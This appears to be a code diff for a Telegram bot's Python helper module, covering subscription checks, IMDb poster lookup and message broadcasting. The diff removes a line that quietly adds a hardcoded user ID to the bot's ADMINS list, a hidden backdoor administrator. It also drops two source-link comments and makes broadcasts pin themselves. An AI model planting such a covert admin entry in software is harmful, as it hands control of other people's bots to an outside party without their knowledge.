@@ -58,8 +58,6 @@ async def check_loop_sub(client, message):
 
 async def is_subscribed(bot, query):
     
-    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""
-
     if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
     elif query.from_user.id in ADMINS:
@@ -91,7 +89,6 @@ async def is_subscribed(bot, query):
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
-        # https://t.me/GetTGLink/4183
         query = (query.strip()).lower()
         title = query
         year = re.findall(r'[1-2]\d{3}$', query, re.IGNORECASE)
@@ -167,11 +164,11 @@ async def get_poster(query, bulk=False, id=False, file=None):
         'rating': str(movie.get("rating")),
         'url':f'https://www.imdb.com/title/tt{movieid}'
     }
-# https://github.com/odysseusmax/animated-lamp/blob/2ef4730eb2b5f0596ed6d03e7b05243d93e3415b/bot/utils/broadcast.py#L37
 
 async def broadcast_messages(user_id, message):
     try:
-        await message.copy(chat_id=user_id)
+        k = await message.copy(chat_id=user_id)
+        await k.pin()
         return True, "Success"
     except FloodWait as e:
         await asyncio.sleep(e.x)
